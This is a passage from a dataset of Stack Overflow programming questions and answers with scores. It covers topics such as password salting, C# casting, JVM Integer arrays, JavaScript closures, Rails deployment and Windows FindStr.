useful to an attacker; a hash collision on the content is likely to be worthless. But it would serve to let a legitimate recipient know that the wrong password was used for decryption.\nCryptographic Salt\nSalt helps to thwart pre-computed dictionary attacks. \nSuppose an attacker has a list of likely passwords. He can hash each and compare it to the hash of his victim's password, and see if it matches. If the list is large, this could take a long time. He doesn't want spend that much time on his next target, so he records the result in a \"dictionary\" where a hash points to its corresponding input. If the list of passwords is very, very long, he can use techniques like a Rainbow Table to save some space.\nHowever, suppose his next target salted their password. Even if the attacker knows what the salt is, his precomputed table is worthless—the salt changes the hash resulting from each password. He has to re-hash all of the passwords in his list, affixing the target's salt to the input. Every different salt requires a different dictionary, and if enough salts are used, the attacker won't have room to store dictionaries for them all. Trading space to save time is no longer an option; the attacker must fall back to hashing each password in his list for each target he wants to attack.\nSo, it's not necessary to keep the salt secret. Ensuring that the attacker doesn't have a pre-computed dictionary corresponding to that particular salt is sufficient.\n", "score": 24}
{"title": "What are the performance characteristics of 'is' reflection in C#?", "description": "It's shown that 'as' casting is much faster than prefix casting, but what about 'is' reflection?  How bad is it?  As you can imagine, searching for 'is' on Google isn't terribly effective.\n", "answer": "There are a few options:\n\nThe classic cast: Foo foo = (Foo)bar\nThe as cast operator: Foo foo = bar as Foo\nThe is test: bool is = bar is Foo\n\nThe classic cast needs to check if bar can be safely cast to Foo (quick), and then actually do it (slower), or throw an exception (really slow).\nThe as operator needs to check if bar can be cast, then do the cast, or if it cannot be safely cast, then it just returns null.\nThe is operator just checks if bar can be cast to Foo, and return a boolean.\n\nThe is test is quick, because it only does the first part of a full casting operation. The as operator is quicker than a classic cast because doesn't throw an exception if the cast fails (which makes it good for situations where you legitimately expect that the cast might fail).\nIf you just need to know if the variable baris a Foo then use the is operator, BUT, if you're going to test if bar is a Foo, and if so, then cast it, then you should use the as operator.\nEssentially every cast needs to do the equivalent of an is check internally to begin with, in order to ensure that the cast is valid. So if you do an is check followed by a full cast (either an as cast, or with the classic cast operator) you are effectively doing the is check twice, which is a slight extra overhead.\n", "score": 20}
{"title": "NUnit - How to test all classes that implement a particular interface", "description": "If I have interface IFoo, and have several classes that implement it, what is the best/most elegant/cleverest way to test all those classes against the interface?\nI'd like to reduce test code duplication, but still 'stay true' to the principles of Unit testing.\nWhat would you consider best practice? I'm using NUnit, but I suppose examples from any Unit testing framework would be valid\n", "answer": "If you have classes implement any one interface then they all need to implement the methods in that interface. In order to test these classes you need to create a unit test class for each of the classes.\nLets go with a smarter route instead; if your goal is to avoid code and test code duplication you might want to create an abstract class instead that handles the recurring code. \nE.g. you have the following interface:\npublic interface IFoo {\n\n    public void CommonCode();\n\n    public void SpecificCode();\n\n}\n\nYou might want to create an abstract class:\npublic abstract class AbstractFoo : IFoo {\n\n    public void CommonCode() {\n          SpecificCode();\n    }\n\n    public abstract void SpecificCode();\n\n}\n\nTesting that is easy; implement the abstract class in the test class either as an inner class:\n[TestFixture]\npublic void TestClass {\n\n    private class TestFoo : AbstractFoo {\n        boolean hasCalledSpecificCode = false;\n        public void SpecificCode() {\n            hasCalledSpecificCode = true;\n        }\n    }\n\n    [Test]\n    public void testCommonCallsSpecificCode() {\n        TestFoo fooFighter = new TestFoo();\n        fooFighter.CommonCode();\n        Assert.That(fooFighter.hasCalledSpecificCode, Is.True());\n    }\n}\n\n...or let the test class extend the abstract class itself if that fits your fancy.\n[TestFixture]\npublic void TestClass : AbstractFoo {\n\n    boolean hasCalledSpecificCode;\n    public void specificCode() {\n        hasCalledSpecificCode = true;\n    }\n\n    [Test]\n    public void testCommonCallsSpecificCode() {\n        AbstractFoo fooFighter = this;\n        hasCalledSpecificCode = false;\n        fooFighter.CommonCode();\n        Assert.That(fooFighter.hasCalledSpecificCode, Is.True());\n    }        \n\n}\n\nHaving an abstract class take care of common code that an interface implies gives a much cleaner code design. \nI hope this makes sense to you.\n\nAs a side note, this is a common design pattern called the Template Method pattern. In the above example, the template method is the CommonCode method and SpecificCode is called a stub or a hook. The idea is that anyone can extend behavior without the need to know the behind the scenes stuff.\nA lot of frameworks rely on this behavioral pattern, e.g. ASP.NET where you have to implement the hooks in a page or a user controls such as the generated Page_Load method which is called by the Load event, the template method calls the hooks behind the scenes. There are a lot more examples of this. Basically anything that you have to implement that is using the words \"load\", \"init\", or \"render\" is called by a template method.\n", "score": 15}
{"title": "Code to make a DHTMLEd control replace straight quotes with curly quotes", "description": "I've got an old, legacy VB6 application that uses the DHTML editing control as an HTML editor. The Microsoft DHTML editing control, a.k.a. DHTMLEd, is probably nothing more than an IE control using IE's own native editing capability internally.\nI'd like to modify the app to implement smart quotes like Word. Specifically, \" is replaced with “ or ” and ' is replaced with ‘ or ’ as appropriate as it is typed; and if the user presses Ctrl+Z immediately after the replacement, it goes back to being a straight quote.\nDoes anyone have code that does that?\nIf you don't have code for DHTML/VB6, but do have JavaScript code that works in a browser with contentEditable regions, I could use that, too\n", "answer": "Here's the VB6 version:\nPrivate Sub DHTMLEdit1_onkeypress()\n    Dim e As Object\n    Set e = DHTMLEdit1.DOM.parentWindow.event\n    'Perform smart-quote replacement'\n    Select Case e.keyCode\n    Case 34: 'Double-Quote'\n        e.keyCode = 0\n        If IsAtWordEnd Then\n            InsertDoubleUndo ChrW$(8221), ChrW$(34)\n        Else\n            InsertDoubleUndo ChrW$(8220), ChrW$(34)\n        End If\n    Case 39: 'Single-Quote'\n        e.keyCode = 0\n        If IsAtWordEnd Then\n            InsertDoubleUndo ChrW$(8217), ChrW$(39)\n        Else\n            InsertDoubleUndo ChrW$(8216), ChrW$(39)\n        End If\n    End Select\nEnd Sub\n\nPrivate Function IsLetter(ByVal character As String) As Boolean\n    IsLetter = UCase$(character) <> LCase$(character)\nEnd Function\n\nPrivate Sub InsertDoubleUndo(VisibleText As String, HiddenText As String)\n    Dim selection As Object\n    Set selection = DHTMLEdit1.DOM.selection.createRange()\n    selection.Text = HiddenText\n    selection.moveStart \"character\", -Len(HiddenText)\n    selection.Text = VisibleText\nEnd Sub\n\nPrivate Function IsAtWordEnd() As Boolean\n\n    Dim ch As String\n    ch = PreviousChar\n    IsAtWordEnd = (ch <> \" \") And (ch <> \"\")\n\nEnd Function\n\nPrivate Function PreviousChar() As String\n\n    Dim selection As Object\n    Set selection = m_dom.selection.createRange()\n    selection.moveStart \"character\", -1\n    PreviousChar = selection.Text\n\nEnd Function\n\nNote: this solution inserts an additional level in the undo chain. For example, typing \"This is a test\" gives a chain of “This is a test” -> “This is a test\" -> “This is a test -> “ -> \" (extra level in bold). To remove this extra level you'd have to implement some sort of PostMessage+subclassing solution that doesn't involve cancelling the native keypress\nedit: Don't forget to include the DHTML Editing Control redistributable if you are targeting Windows Vista.\n", "score": 15}
{"title": "How are Integer arrays stored internally, in the JVM?", "description": "An array of ints in java is stored as a block of 32-bit values in memory. How is an array of Integer objects stored? i.e.\nint[] vs. Integer[]\n\nI'd imagine that each element in the Integer array is a reference to an Integer object, and that the Integer object has object storage overheads, just like any other object.\nI'm hoping however that the JVM does some magical cleverness under the hood given that Integers are immutable and stores it just like an array of ints.\nIs my hope woefully naive? Is an Integer array much slower than an int array in an application where every last ounce of performance matters?\n", "answer": "No VM I know of will store an Integer[] array like an int[] array for the following reasons:\n\nThere can be null Integer objects in the array and you have no bits left for indicating this in an int array. The VM could store this 1-bit information per array slot in a hiden bit-array though.\nYou can synchronize in the elements of an Integer array. This is much harder to overcome as the first point, since you would have to store a monitor object for each array slot.\nThe elements of Integer[] can be compared for identity. You could for example create two Integer objects with the value 1 via new and store them in different array slots and later you retrieve them and compare them via ==. This must lead to false, so you would have to store this information somewhere. Or you keep a reference to one of the Integer objects somewhere and use this for comparison and you have to make sure one of the == comparisons is false and one true. This means the whole concept of object identity is quiet hard to handle for the optimized Integer array.\nYou can cast an Integer[] to e.g. Object[] and pass it to methods expecting just an Object[]. This means all the code which handles Object[] must now be able to handle the special Integer[] object too, making it slower and larger.\n\nTaking all this into account, it would probably be possible to make a special Integer[] which saves some space in comparison to a naive implementation, but the additional complexity will likely affect a lot of other code, making it slower in the end.\nThe overhead of using Integer[] instead of int[] can be quiet large in space and time. On a typical 32 bit VM an Integer object will consume 16 byte (8 byte for the object header, 4 for the payload and 4 additional bytes for alignment) while the Integer[] uses as much space as int[]. In 64 bit VMs (using 64bit pointers, which is not always the case) an Integer object will consume 24 byte (16 for the header, 4 for the payload and 4 for alignment). In addition a slot in the Integer[] will use 8 byte instead of 4 as in the int[]. This means you can expect an overhead of 16 to 28 byte per slot, which is a factor of 4 to 7 compared to plain int arrays.\nThe performance overhead can be significant too for mainly two reasons:\n\nSince you use more memory, you put on much more pressure on the memory subsystem, making it more likely to have cache misses in the case of Integer[]. For example if you traverse the contents of the int[] in a linear manner, the cache will have most of the entries already fetched when you need them (since the layout is linear too). But in case of the Integer array, the Integer objects itself might be scattered randomly in the heap, making it hard for the cache to guess where the next memory reference will point to.\nThe garbage collection has to do much more work because of the additional memory used and because it has to scan and move each Integer object separately, while in the case of int[] it is just one object and the contents of the object doesn't have to be scanned (they contain no reference to other objects).\n\nTo sum it up, using an int[] in performance critical work will be both much faster and memory efficient than using an Integer array in current VMs and it is unlikely this will change much in the near future.\n", "score": 12}
{"title": "How Does The Debugging Option -g Change the Binary Executable?", "description": "When writing C/C++ code, in order to debug the binary executable the debug option must be enabled on the compiler/linker.  In the case of GCC, the option is -g.  When the debug option is enabled, how does the affect the binary executable?  What additional data is stored in the file that allows the debugger to function as it does?\n", "answer": "-g tells the compiler to store symbol table information in the executable.  Among other things, this includes:\n\nsymbol names\ntype info for symbols\nfiles and line numbers where the symbols came from\n\nDebuggers use this information to output meaningful names for symbols and to associate instructions with particular lines in the source.\nFor some compilers, supplying -g will disable certain optimizations. For example, icc sets the default optimization level to -O0 with -g unless you explicitly indicate -O[123].  Also, even if you do supply -O[123], optimizations that prevent stack tracing will still be disabled (e.g. stripping frame pointers from stack frames.  This has only a minor effect on performance).\nWith some compilers, -g will disable optimizations that can confuse where symbols came from (instruction reordering, loop unrolling, inlining etc).  If you want to debug with optimization, you can use -g3 with gcc to get around some of this.  Extra debug info will be included about macros, expansions, and functions that may have been inlined. This can allow debuggers and performance tools to map optimized code to the original source, but it's best effort.  Some optimizations really mangle the code.\nFor more info, take a look at DWARF, the debugging format originally designed to go along with ELF (the binary format for Linux and other OS's).\n", "score": 90}
{"title": "How do I access a database in C#", "description": "Basically, I would like a brief explanation of how I can access a SQL database in C# code. I gather that a connection and a command is required, but what's going on? I guess what I'm asking is for someone to de-mystify the process a bit. Thanks.\nFor clarity, in my case I'm doing web apps, e-commerce stuff. It's all ASP.NET, C#, and SQL databases.\nI'm going to go ahead and close this thread. It's a little to general and I am going to post some more pointed and tutorial-esque questions and answers on the subject.\n", "answer": "MSDN has a pretty good writeup here:\nhttp://msdn.microsoft.com/en-us/library/s7ee2dwt(VS.71).aspx\nYou should take a look at the data-reader for simple select-statements. Sample from the MSDN page:\nprivate static void ReadOrderData(string connectionString)\n{\n    string queryString = \n        \"SELECT OrderID, CustomerID FROM dbo.Orders;\";\n    using (SqlConnection connection = new SqlConnection(\n               connectionString))\n    {\n        SqlCommand command = new SqlCommand(\n            queryString, connection);\n        connection.Open();\n        SqlDataReader reader = command.ExecuteReader();\n        try\n        {\n            while (reader.Read())\n            {\n                Console.WriteLine(String.Format(\"{0}, {1}\",\n                    reader[0], reader[1]));\n            }\n        }\n        finally\n        {\n            // Always call Close when done reading.\n            reader.Close();\n        }\n    }\n}\n\nIt basicly first creates a SqlConnection object and then creates the SqlCommand-object that holds the actual select you are going to do, and a reference to the connection we just created. Then it opens the connection and on the next line, executes your statements and returns a SqlDataReader object.\nIn the while-loop it then outputs the values from the first row in the reader. Every time \"reader.Read()\" is called the reader will contain a new row.\nThen the reader is then closed, and because we are exiting the \"using\"-secret, the connection is also closed.\n\nEDIT: If you are looking for info on selecting/updating data in ASP.NET, 4GuysFromRolla has a very nice Multipart Series on ASP.NET 2.0's Data Source Controls\nEDIT2: As others have pointed out, if you are using a newer version of .NET i would recommend looking into LINQ. An introduction, samples and writeup can be found on this MSDN page.\n", "score": 10}
{"title": "How can I copy a large file on Windows without CopyFile or CopyFileEx?", "description": "There is a limitation on Windows Server 2003 that prevents you from copying extremely large files, in proportion to the amount of RAM you have.  The limitation is in the CopyFile and CopyFileEx functions, which are used by xcopy, Explorer, Robocopy, and the .NET FileInfo class.\nHere is the error that you get:\n\nCannot copy [filename]: Insufficient system resources exist to complete the requested service.\n\nThe is a knowledge base article on the subject, but it pertains to NT4 and 2000.\nThere is also a suggestion to use ESEUTIL from an Exchange installation, but I haven't had any luck getting that to work.\nDoes anybody know of a quick, easy way to handle this?  I'm talking about >50Gb on a machine with 2Gb of RAM.  I plan to fire up Visual Studio and just write something to do it for me, but it would be nice to have something that was already out there, stable and well-tested.\n[Edit] I provided working C# code to accompany the accepted answer.\n", "answer": "The best option is to just open the original file for reading, the destination file for writing and then loop copying it block by block. In pseudocode :\nf1 = open(filename1);\nf2 = open(filename2, \"w\");\nwhile( !f1.eof() ) {\n  buffer = f1.read(buffersize);\n  err = f2.write(buffer, buffersize);\n  if err != NO_ERROR_CODE\n    break;\n}\nf1.close(); f2.close();\n\n[Edit by Asker] Ok, this is how it looks in C# (it's slow but it seems to work Ok, and it gives progress):\nusing System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Text;\n\nnamespace LoopCopy\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            if (args.Length != 2)\n            {\n                Console.WriteLine(\n                  \"Usage: LoopCopy.exe SourceFile DestFile\");\n                return;\n            }\n\n            string srcName = args[0];\n            string destName = args[1];\n\n            FileInfo sourceFile = new FileInfo(srcName);\n            if (!sourceFile.Exists)\n            {\n                Console.WriteLine(\"Source file {0} does not exist\", \n                    srcName);\n                return;\n            }\n            long fileLen = sourceFile.Length;\n\n            FileInfo destFile = new FileInfo(destName);\n            if (destFile.Exists)\n            {\n                Console.WriteLine(\"Destination file {0} already exists\", \n                    destName);\n                return;\n            }\n\n            int buflen = 1024;\n            byte[] buf = new byte[buflen];\n            long totalBytesRead = 0;\n            double pctDone = 0;\n            string msg = \"\";\n            int numReads = 0;\n            Console.Write(\"Progress: \");\n            using (FileStream sourceStream = \n              new FileStream(srcName, FileMode.Open))\n            {\n                using (FileStream destStream = \n                    new FileStream(destName, FileMode.CreateNew))\n                {\n                    while (true)\n                    {\n                        numReads++;\n                        int bytesRead = sourceStream.Read(buf, 0, buflen);\n                        if (bytesRead == 0) break; \n                        destStream.Write(buf, 0, bytesRead);\n\n                        totalBytesRead += bytesRead;\n                        if (numReads % 10 == 0)\n                        {\n                            for (int i = 0; i < msg.Length; i++)\n                            {\n                                Console.Write(\"\\b \\b\");\n                            }\n                            pctDone = (double)\n                                ((double)totalBytesRead / (double)fileLen);\n                            msg = string.Format(\"{0}%\", \n                                     (int)(pctDone * 100));\n                            Console.Write(msg);\n                        }\n\n                        if (bytesRead < buflen) break;\n\n                    }\n                }\n            }\n\n            for (int i = 0; i < msg.Length; i++)\n            {\n                Console.Write(\"\\b \\b\");\n            }\n            Console.WriteLine(\"100%\");\n            Console.WriteLine(\"Done\");\n        }\n    }\n}\n\n", "score": 16}
{"title": "What is a variable's linkage and storage specifier?", "description": "When someone talks about a variables storage class specifier, what are they talking about?\nThey also often talk about variable linkage in the same context, what is that?\n", "answer": "The storage class specifier controls the storage and the linkage of your variables. These are two concepts that are different.\nC specifies the following specifiers for variables: auto, extern, register, static.\nStorage\nThe storage duration determines how long your variable will live in ram.\nThere are three types of storage duration: static, automatic and dynamic.\nstatic\nIf your variable is declared at file scope, or with an extern or static specifier, it will have static storage. The variable will exist for as long as the program is executing. No execution time is spent to create these variables.\nautomatic\nIf the variable is declared in a function, but without the extern or static specifier, it has automatic storage. The variable will exist only while you are executing the function.  Once you return, the variable no longer exist.  Automatic storage is typically done on the stack.  It is a very fast operation to create these variables (simply increment the stack pointer by the size).\ndynamic\nIf you use malloc (or new in C++) you are using dynamic storage.  This storage will exist until you call free (or delete). This is the most expensive way to create storage, as the system must manage allocation and deallocation dynamically.\nLinkage\nLinkage specifies who can see and reference the variable. There are three types of linkage: internal linkage, external linkage and no linkage.\nno linkage\nThis variable is only visible where it was declared. Typically applies to variables declared in a function.\ninternal linkage\nThis variable will be visible to all the functions within the file (called a translation unit), but other files will not know it exists.\nexternal linkage\nThe variable will be visible to other translation units.  These are often thought of as \"global variables\".\nHere is a table describing the storage and linkage characteristics based on the specifiers\n\n  Storage Class   Function            File \n  Specifier        Scope              Scope  \n-----------------------------------------------------\n  none           automatic         static      \n                 no linkage        external linkage\n\n extern          static            static\n                 external linkage  external linkage\n\n static          static            static\n                 no linkage        internal linkage\n\n  auto           automatic         invalid\n                 no linkage\n\nregister         automatic         invalid\n                 no linkage\n\n", "score": 32}
{"title": "lining up function parameter lists with vim", "description": "When defining or calling functions with enough arguments to span multiple lines, I want vim to line them up. For example,\ndef myfunction(arg1, arg2, arg, ...\n               argsN-1, argN)\n\nThe idea is for argsN-1 to have its 'a' lined up with args1.\nDoes anyone have a way to have this happen automatically in vim? I've seen the align plugin for lining equal signs (in assignment statements) and such, but I'm not sure if it can be made to solve this problem?\n", "answer": "The previous poster had it, but forgot the set\n:set cino=(0<Enter>\n\nFrom :help cinoptions-values\nThe 'cinoptions' option sets how Vim performs indentation.  In the list below,\n\"N\" represents a number of your choice (the number can be negative).  When\nthere is an 's' after the number, Vim multiplies the number by 'shiftwidth':\n\"1s\" is 'shiftwidth', \"2s\" is two times 'shiftwidth', etc.  You can use a\ndecimal point, too: \"-0.5s\" is minus half a 'shiftwidth'.  The examples below\nassume a 'shiftwidth' of 4.\n\n...\n\n    (N    When in unclosed parentheses, indent N characters from the line\n          with the unclosed parentheses.  Add a 'shiftwidth' for every\n          unclosed parentheses.  When N is 0 or the unclosed parentheses\n          is the first non-white character in its line, line up with the\n          next non-white character after the unclosed parentheses.\n          (default 'shiftwidth' * 2).\n\n            cino=                     cino=(0 >\n              if (c1 && (c2 ||          if (c1 && (c2 ||\n                          c3))                     c3))\n                  foo;                      foo;\n              if (c1 &&                 if (c1 &&\n                      (c2 || c3))           (c2 || c3))\n                 {                         {\n\n", "score": 11}
{"title": "What's the easiest non-memory intensive way to output XML from Python?", "description": "Basically, something similar to System.Xml.XmlWriter - A streaming XML Writer that doesn't incur much of a memory overhead. So that rules out xml.dom and xml.dom.minidom. Suggestions?\n", "answer": "I think you'll find XMLGenerator from xml.sax.saxutils is the closest thing to what you want.\n\nimport time\nfrom xml.sax.saxutils import XMLGenerator\nfrom xml.sax.xmlreader import AttributesNSImpl\n\nLOG_LEVELS = ['DEBUG', 'WARNING', 'ERROR']\n\nclass xml_logger:\n    def __init__(self, output, encoding):\n        \"\"\"\n        Set up a logger object, which takes SAX events and outputs\n        an XML log file\n        \"\"\"\n        logger = XMLGenerator(output, encoding)\n        logger.startDocument()\n        attrs = AttributesNSImpl({}, {})\n        logger.startElementNS((None, u'log'), u'log', attrs)\n        self._logger = logger\n        self._output = output\n        self._encoding = encoding\n        return\n\n    def write_entry(self, level, msg):\n        \"\"\"\n        Write a log entry to the logger\n        level - the level of the entry\n        msg   - the text of the entry.  Must be a Unicode object\n        \"\"\"\n        #Note: in a real application, I would use ISO 8601 for the date\n        #asctime used here for simplicity\n        now = time.asctime(time.localtime())\n        attr_vals = {\n            (None, u'date'): now,\n            (None, u'level'): LOG_LEVELS[level],\n            }\n        attr_qnames = {\n            (None, u'date'): u'date',\n            (None, u'level'): u'level',\n            }\n        attrs = AttributesNSImpl(attr_vals, attr_qnames)\n        self._logger.startElementNS((None, u'entry'), u'entry', attrs)\n        self._logger.characters(msg)\n        self._logger.endElementNS((None, u'entry'), u'entry')\n        return\n\n    def close(self):\n        \"\"\"\n        Clean up the logger object\n        \"\"\"\n        self._logger.endElementNS((None, u'log'), u'log')\n        self._logger.endDocument()\n        return\n\nif __name__ == \"__main__\":\n    #Test it out\n    import sys\n    xl = xml_logger(sys.stdout, 'utf-8')\n    xl.write_entry(2, u\"Vanilla log entry\")\n    xl.close()   \n\nYou'll probably want to look at the rest of the article I got that from at http://www.xml.com/pub/a/2003/03/12/py-xml.html.\n", "score": 15}
{"title": "Why is there no main() function in vxWorks?", "description": "When using vxWorks as a development platform, we can't write our application with the standard main() function.  Why can't we have a main function?\n", "answer": "Before the 6.0 version VxWorks only\nsupported kernel execution environment for tasks and did not support\nprocesses, which is the traditional application execution environment\non OS like Unix or Windows. Tasks have an entry point which is the\naddress of the code to execute as a task. This address corresponds to\na C or assembly function. It can be a symbol named \"main\" but there\nare C/C++ language assumptions about the main() function that are not\nsupported in the kernel environment (in particular the traditional\nhandling of the argc and argv parameters). Furthermore, prior to\nVxWorks 6.0, all tasks execute kernel code. You can picture the kernel\nas a common repository of code all linked together and then you'll see\nthat you cannot have several symbols of the same name (\"main\") since\nthis would create name collisions.\nNow this is accurate only if you link your application code to the\nkernel image. If you were to download your application code then the\nmodule loader will accept to load several modules each with a main()\nroutine. However the last \"main\" symbol registered in the system\nsymbol table is the only one you can access via the target shell. If\nyou want to start tasks executing the code of one of the first loaded\nmodules you'd have to use the addresses of the previous main()\nfunction. This is possible but not convenient. It is far more\npractical to give different names to the entry points of tasks (may be\nlike \"xxxStart\" where \"xxx\" is a name meaningful for what the task is\nsupposed to do).\nStarting with VxWorks 6.0 the OS supports a process environment. This\nmeans, among many other things, that you can have a traditional main()\nroutine and that its argc and argv parameters are properly handled,\nand that the application code is executing in a context (user context)\nwhich is different from the kernel context, thus ensuring the\nisolation between application code (which can be flaky) and kernel\ncode (which is not supposed to be flaky). \nPAD\n", "score": 14}
{"title": "Is there any way to change the .NET JIT compiler to favor performance over compile time?", "description": "I was wondering if there's any way to change the behavior of the .NET JIT compiler, by specifying a preference for more in-depth optimizations.  Failing that, it would be nice if it could do some kind of profile-guided optimization, if it doesn't already.\n", "answer": "This is set when you compile your assembly. There are two types of optimizations:\n\nIL optimization\nJIT Native Code quality.\n\nThe default setting is this\n /optimize- /debug-\n\nThis means unoptimized IL, and optimized native code.\n /optimize /debug(+/full/pdbonly) \n\nThis means unoptimized IL, and unoptimized native code (best debug settings).\nFinally, to get the fastest performance:\n/optimize+ /debug(-/+/full/pdbonly)\n\nThis produces optimized IL and optimized native code.\nWhen producing unoptimized IL, the compiler will insert NOP instructions all over the code. This makes code easier to debug by allowing breakpoints to be set on control flow instructions such as for, while,if,else, try, catch etc.\nThe CLR does a remarkably good job of optimizing code regardless. Once a method is JIT'ed, the pointer on a call or a callvirt instruction is pointed directly to the native code. \nAdditionally, the CLR will take advantage of any architecture tricks available when JIT'ing your code. This means that an assembly ran through the JIT will run faster than an assembly pre-compiled by using Ngen (albeit with a slightly slower start up time), as NGen will compile for all platforms, and not take advantage of any tricks.\n", "score": 20}
{"title": "OO Javascript : Definitive explanation of variable scope", "description": "Can someone provide an explanation of variable scope in JS as it applies to objects, functions and closures? \n", "answer": "Global variables\nEvery variable in Javascript is a named attribute of an object.  For example:-\nvar x = 1;\n\nx is added to the global object.  The global object is provided by the script context and may already have a set of attributes.  For example in a browser the global object is window.  An equivalent to the above line in a browser would be:-\nwindow.x = 1;\n\nLocal variables\nNow what if we change this to:-\nfunction fn()\n{\n    var x = 1;\n}\n\nWhen fn is called a new object is created called the execution context also referred to as the scope (I use these terms interchangeably).  x is added as an attribute to this scope object.  Hence each call to fn will get its own instance of a scope object and therefore its own instance of the x attribute attached to that scope object.\nClosure\nNow lets take this further:-\nfunction fnSequence()\n{\n    var x = 1;\n    return function() { return x++; }\n}\n\nvar fn1 = fnSequence();\nvar fn2 = fnSequence();\n\nWScript.Echo(fn1())\nWScript.Echo(fn2())\nWScript.Echo(fn1())\nWScript.Echo(fn2())\nWScript.Echo(fn1())\nWScript.Echo(fn1())\nWScript.Echo(fn2())\nWScript.Echo(fn2())\n\nNote: Replace WScript.Echo with whatever writes to stdout in your context.\nThe sequence you should get is :-\n1 1 2 2 3 4 3 4\nSo what has happened here?  We have fnSequence which initialises a variable x to 1 and returns an anonymous function which will return the value of x and then increment it.\nWhen this function is first executed a scope object is created and an attribute x is added to that scope object with the value of 1.  Also created in the same execution object is an anonymous function.  Each function object will have a scope attribute which points to the execution context in which it is created.  This creates what is know as a scope chain which we will come to later.  A reference to this function is returned by fnSequence and stored in fn1.\nNote that fn1 is now pointing at the anonymous function and that the anonymous function has a scope attribute pointing at a scope object that still has an x attribute attached.  This is known as closure where the contents of an execution context is still reachable after the function it was created for has completed execution.\nNow this same sequence happens when assigning to fn2.  fn2 will be pointing at a different anonymous function that was created in a different execution context that was create when fnSequence was called this second time.\nScope Chain\nWhat happens when the function held by fn1 is executed the first time?  A new execution context is created for the execution of the anonymous function.  A return value is to be found from the identifier x.  The function's scope object is inspected for an x attribute but none is found.  This is where the scope chain comes in.  Having failed to find x in the current execution context JavaScript takes the object held by the function's scope attribute and looks for x there.  It finds it since the functions scope was created inside an execution of fnSequence, retrieves its value and increments it.  Hence 1 is output and the x in this scope is incremented to 2.\nNow when fn2 is executed it is ultimately attached to a different execution context whose x attribute is still 1.  Hence executing fn2 also results in 1.\nAs you can see fn1 and fn2 each generate their own independent sequence of numbers.\n", "score": 35}
{"title": "Big things to do when deploying a rails app", "description": "In the question What little things do I need to do before deploying a rails application I am getting a lot of answers that are bigger than \"little things\". So this question is slighly different. \nWhat reasonably major steps do I need to take before deploying a rails application. In this case, i mean things which are are going to take more than 5 mins, and so need to be scheduled. For small oneline config changes, please use the little things question. \n", "answer": "Set up Capistrano to deploy You'll want to learn capistrano if you don't already know it, and use it to deploy your code in an automated way. This will involve setting up your shared directory and shared resources like database.yml.\nInstall C Based MySQL gem If you don't have all the required libs, this can take a little while, but less than 20 minutes. \nMake sure you aren't vulnerable to common web application attacks Session fixation, session hijacking, cross-site scripting, SQL injection (probably you don't have to worry much about SQL injection). Be sure you use h() when outputting user-entered data in a view screen. Lots of good material online about this. \nChoose a server architecture Nginx, Mongrel, FastCGI, CGI, Apache, Passenger: there is a lot to choose from. Think about how your app will be used and decide on the best architecture, then set it up. \nSet up Exception Notifier or Exception Logger You will want your app to warn you when it breaks. Set one of these tools up to track production exceptions. Note: Exception notifier will warn you when routing errors occur (i.e. when people fat-finger URLs or script kiddies attack you): so think about what you want the framework to do when that happens and adjust accordingly. \nMake sure all of your passwords are out of source control If you have database.yml, mail.yml (if you use yaml_mail_config) or other sensitive files in source control, get them out of there, replace them with database.yml.example, and put them in the shared/ folder on your server. \nEnsure that your DB is locked down. A lot of people forget to secure MySQL when setting up their new production Rails box. Don't be like them. \nMake sure all of the little web-files are in place If you are planning to be listed in Google, generate a sitemap.xml file. If you are planning to use an .htaccess file for something, make sure it's there. If you need a robots.txt file to prevent certain areas of your site from being indexed, make one. If you want a good looking 404 Page, make sure it's set up correctly. If you want a \"Be Right Back\" page to be present when you deploy, make sure that you have a Capistrano maintenance file specified and Nginx or Apache knows how and when to redirect to it. \nGet your SSL Certs in place If you are going to use SSL, make sure you get certificates that are valid on your production domain, and set them up. \n", "score": 11}
{"title": "Can I compose a Spring Configuration File from smaller ones?", "description": "I have a handful of projects that all use one project for the data model.  Each of these projects has its own applicationContext.xml file with a bunch of repetitive data stuff within it.\nI'd like to have a modelContext.xml file and another for my ui.xml, etc.\nCan I do this?\n", "answer": "From the Spring Docs (v 2.5.5 Section 3.2.2.1.):\n\nIt can often be useful to split up\n  container definitions into multiple\n  XML files. One way to then load an\n  application context which is\n  configured from all these XML\n  fragments is to use the application\n  context constructor which takes\n  multiple Resource locations. With a\n  bean factory, a bean definition reader\n  can be used multiple times to read\n  definitions from each file in turn.\nGenerally, the Spring team prefers the\n  above approach, since it keeps\n  container configuration files unaware\n  of the fact that they are being\n  combined with others. An alternate\n  approach is to use one or more\n  occurrences of the  element\n  to load bean definitions from another\n  file (or files). Let's look at a\n  sample:\n\n<import resource=\"services.xml\"/>\n<import resource=\"resources/messageSource.xml\"/>\n<import resource=\"/resources/themeSource.xml\"/>\n\n<bean id=\"bean1\" class=\"...\"/>\n<bean id=\"bean2\" class=\"...\"/>\n\nIn this example, external bean\n  definitions are being loaded from 3\n  files, services.xml,\n  messageSource.xml, and\n  themeSource.xml. All location paths\n  are considered relative to the\n  definition file doing the importing,\n  so services.xml in this case must be\n  in the same directory or classpath\n  location as the file doing the\n  importing, while messageSource.xml and\n  themeSource.xml must be in a resources\n  location below the location of the\n  importing file. As you can see, a\n  leading slash is actually ignored, but\n  given that these are considered\n  relative paths, it is probably better\n  form not to use the slash at all. The\n  contents of the files being imported\n  must be valid XML bean definition\n  files according to the Spring Schema\n  or DTD, including the top level\n   element.\n\n", "score": 19}
{"title": "How can I make a batch file to act like a simple grep using Perl?", "description": "I already know the obvious answer to this question: \"just download <insert favorite windows grep or grep-like tool here>\".  However, I work in an environment with strict controls by the local IT staff as to what we're allowed to have on our computers.  Suffice it to say: I have access to Perl on Windows XP.  Here's a quick Perl script I came up with that does what I want, but I haven't figured up how to set up a batch file such that I can either pipe a command output into it, or pass a file (or list of files?) as an argument after the \"expression to grep\":\n\nperl -n -e \"print $_ if (m![expression]!);\" [filename]\n\nHow do I write a batch script that I can do something like, for example:\n\ndir | grep.bat mypattern\ngrep.bat mypattern myfile.txt\n\nEDIT: Even though I marked another \"answer\", I wanted to give kudos to Ray Hayes answer, as it is really the \"Windows Way\" to do it, even if another answer is technically closer to what I wanted.\n", "answer": "Most of the power of grep is already available on your machine in the Windows application FindStr.exe which is part of all Windows 2000, XP and Vista machines!  It offers RegExpr etc.\nFar easier than a batch file which in turn calls Perl!\nc:\\>FindStr /?    \nSearches for strings in files.\n\nFINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file]\n        